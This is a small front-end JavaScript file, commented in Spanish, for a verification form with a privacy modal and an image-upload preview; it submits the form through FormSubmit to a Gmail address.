// --- 1. Lógica del Modal de Privacidad ---
const modal = document.getElementById('privacy-modal');

function openModal() {
    modal.style.display = 'flex';
}

function closeModal() {
    modal.style.display = 'none';
}

// Cerrar modal si hacen clic afuera del contenido
window.onclick = function(event) {
    if (event.target == modal) {
        closeModal();
    }
}

// --- 2. Lógica para la Vista Previa de Imagen ---
const fileInput = document.querySelector('.file-input');
const imgPreview = document.getElementById('img-preview');
const uploadIcon = document.getElementById('upload-icon');
const fileFeedback = document.getElementById('file-feedback');

fileInput.addEventListener('change', function() {
    const file = this.files[0];

    if (file) {
        if (file.size > 5 * 1024 * 1024) {
            alert("El archivo es demasiado grande (Máx 5MB).");
            this.value = ""; 
            return;
        }

        const reader = new FileReader();
        reader.onload = function(e) {
            imgPreview.src = e.target.result;
            imgPreview.style.display = "block"; 
            uploadIcon.style.opacity = "0"; 
        }
        reader.readAsDataURL(file);

        fileFeedback.style.display = 'block';
        fileFeedback.textContent = "Listo: " + file.name;
    } else {
        imgPreview.style.display = "none";
        uploadIcon.style.opacity = "1";
        fileFeedback.style.display = 'none';
    }
});

// --- 3. Manejo del envío (FormSubmit AJAX) ---
const form = document.getElementById('verification-form');
const submitBtn = document.getElementById('submit-btn');

form.addEventListener('submit', function(e) {
    e.preventDefault();

    submitBtn.textContent = "Enviando...";
    submitBtn.disabled = true;
    submitBtn.style.opacity = "0.7";

    const formData = new FormData(form);

    // Usando el correo especificado
    fetch("https://formsubmit.co/ajax/verificacionsloetgames@gmail.com", {
        method: "POST",
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        form.style.display = 'none';
        document.getElementById('success-screen').style.display = 'block';
        window.scrollTo(0,0);
    })
    .catch(error => {
        console.error('Error:', error);
        alert("Error al conectar. Intenta nuevamente.");
        submitBtn.textContent = "Enviar";
        submitBtn.disabled = false;
        submitBtn.style.opacity = "1";
    });
});
